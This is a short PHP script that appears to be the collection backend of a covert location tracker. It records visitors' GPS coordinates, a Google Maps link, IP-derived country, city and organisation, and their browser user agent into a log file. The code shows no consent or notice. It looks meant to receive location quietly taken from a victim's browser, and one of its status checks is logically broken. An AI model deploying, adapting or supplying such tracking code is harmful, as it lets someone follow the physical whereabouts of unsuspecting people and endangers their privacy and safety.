<?php
$dir = '/var/www/logs.txt'; // change this to the directory where you like the logsfile to be
if (isset($_GET["lat"]) && isset($_GET["lon"]) && isset($_GET["address"])){
    $ip = $_GET["address"];
    
    function get($url){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        curl_close($ch);
        return json_decode($res, true);
    }
    
    $ipinf = get("https://ipinfo.io/$ip/json");

    if (!$ipinf["status"] == 404){
        date_default_timezone_set($ipinf["timezone"]);
        $infos = "REQUEST FROM " . $ip . " at " . date("H:i:s") . " [in " . $ipinf["timezone"] . "]" . "\nLatitude: " . $_GET["lat"] . "\nLongitude: " . $_GET["lon"] . 
        "\nGoogle Maps: https://www.google.com/maps/search/?api=1&query=" . $_GET["lat"] . "," . $_GET["lon"] . "\nCountry Code: " . $ipinf["country"] . 
        "\nTimezone: " . $ipinf["timezone"] . "\nState: " . $ipinf["region"] . 
        "\nCity: ". $ipinf["postal"] . " " . $ipinf["city"] . "\nOrganization: " . $ipinf["org"] . "\nUser Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n\n";
    }
    else{
        $infos = "REQUEST FROM " . $_SERVER["REMOTE_ADDR"] . " at " . date("H:i:s") . "\nLatitude: " . $_GET["lat"] . "\nLongitude: " . $_GET["lon"] . 
        "\nGoogle Maps: https://www.google.com/maps/search/?api=1&query=" . $_GET["lat"] . "," . $_GET["lon"] . "\nUser Agent: '" . $_SERVER['HTTP_USER_AGENT'] . "'\n\n";
    }
    
    
    if (!file_exists($dir))
        fopen($dir, "w"); // generate file if it does not alredy exist
    file_put_contents($dir, file_get_contents($dir) . "*****************************\n\n" . $infos, false);
    
}

?>
